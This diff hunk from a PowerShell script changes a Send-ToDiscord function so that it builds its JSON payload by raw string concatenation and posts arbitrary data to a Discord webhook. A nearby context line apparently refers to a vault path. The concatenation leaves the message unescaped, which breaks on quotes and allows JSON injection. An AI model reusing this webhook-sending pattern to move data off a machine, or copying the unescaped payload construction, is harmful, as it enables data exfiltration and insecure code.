@@ -323,19 +323,18 @@ vault -ErrorAction SilentlyContinue -Force
 function Send-ToDiscord {
     param ($Message)
 
-    # Define the JSON payload
-    $payload = @{
-        "content" = "```$Message```"
-    } | ConvertTo-Json -Compress
+    # Create a raw JSON payload directly
+    $payload = '{"content": "```' + $Message + '```"}'
 
     try {
-        # Invoke-RestMethod without the headers dictionary
+        # Send the request with the raw JSON payload
         Invoke-RestMethod -Uri $DiscordWebhookUrl -Method "Post" -ContentType "application/json" -Body $payload
         Write-Host "Data sent to Discord successfully."
     } catch {
         Write-Error "Failed to send data to Discord."
     }
 }
+
 
 
 
